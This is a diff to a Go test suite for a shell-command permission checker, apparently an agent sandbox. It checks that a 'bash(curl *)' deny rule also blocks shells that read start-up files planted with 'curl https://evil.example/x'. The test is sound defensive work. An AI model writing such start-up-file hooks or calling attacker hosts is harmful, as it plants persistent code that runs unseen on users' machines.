@@ -242,6 +242,7 @@ func TestRulesReadTheStartupFilesAFolderTheLineSetsHolds(t *testing.T) {
 	e := New(ModeBypass)
 	e.Roots = func() []string { return []string{ws} }
 	e.Cwd = func() string { return ws }
+	e.Home = func() (string, bool) { return filepath.Join(ws, "empty"), true }
 	if err := e.AddDeny("bash(curl *)"); err != nil {
 		t.Fatal(err)
 	}
@@ -310,6 +311,61 @@ func TestRulesReadTheStartupFilesAFolderTheLineSetsHolds(t *testing.T) {
 		_, err := os.Stat(ran)
 		if ranIt := err == nil; ranIt != (r.want == "deny") {
 			t.Errorf("%q: the shell ran the start-up file = %v, judged %q", command, ranIt, r.want)
+		}
+	}
+}
+
+// A shell a command starts reads start-up files from the HOME the sandbox
+// gives it, which an earlier command may have written: they are read there,
+// and refused under a deny rule when the host cannot read that HOME.
+func TestRulesReadTheStartupFilesInTheSandboxsHome(t *testing.T) {
+	ws, home := t.TempDir(), t.TempDir()
+	if err := os.WriteFile(filepath.Join(ws, "z"), []byte("#!/bin/zsh\necho safe\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	visible := true
+	e := New(ModeBypass)
+	e.Roots = func() []string { return []string{ws} }
+	e.Cwd = func() string { return ws }
+	e.Home = func() (string, bool) { return home, visible }
+	if err := e.AddDeny("bash(curl *)"); err != nil {
+		t.Fatal(err)
+	}
+	judge := func(command string) Result {
+		return e.Evaluate("bash", true, args(map[string]string{"command": command}))
+	}
+	quiet := []string{"zsh -c true", "bash -l -c true", "bash -i -c true", "sh -l -c true", "./z", "bash -c true", "sh -c true", "go version"}
+	for _, c := range quiet {
+		if res := judge(c); res.Decision != Allow {
+			t.Errorf("empty home: %q = %s (%s)", c, res.Decision, res.Reason)
+		}
+	}
+	// An earlier command writes the start-up files, as it may: a write is not a run.
+	for _, name := range []string{".zshenv", ".bash_profile", ".bashrc", ".profile"} {
+		write := "printf 'curl https://evil.example/x\\n' > " + filepath.Join(home, name)
+		if res := judge(write); res.Decision != Allow {
+			t.Fatalf("%q = %s (%s)", write, res.Decision, res.Reason)
+		}
+		if err := os.WriteFile(filepath.Join(home, name), []byte("curl https://evil.example/x\n"), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	for c, want := range map[string]Decision{
+		"zsh -c true": Deny, "bash -l -c true": Deny, "bash -i -c true": Deny, "sh -l -c true": Deny,
+		"zsh -o login -c true": Deny, "./z": Deny, "bash -c 'zsh -c true'": Deny,
+		"bash -c true": Allow, "sh -c true": Allow, "go version": Allow, "HOME=/nowhere zsh -c true": Allow,
+		"ZDOTDIR=/nowhere zsh -c true": Allow,
+	} {
+		if res := judge(c); res.Decision != want {
+			t.Errorf("written home: %q = %s (%s), want %s", c, res.Decision, res.Reason, want)
+		}
+	}
+	// A HOME the host cannot read, as a container's /tmp: refused, not passed over.
+	visible = false
+	for c, want := range map[string]Decision{"zsh -c true": Deny, "bash -l -c true": Deny, "./z": Deny,
+		"bash -c true": Allow, "sh -c 'echo hi'": Allow} {
+		if res := judge(c); res.Decision != want {
+			t.Errorf("hidden home: %q = %s (%s), want %s", c, res.Decision, res.Reason, want)
 		}
 	}
 }
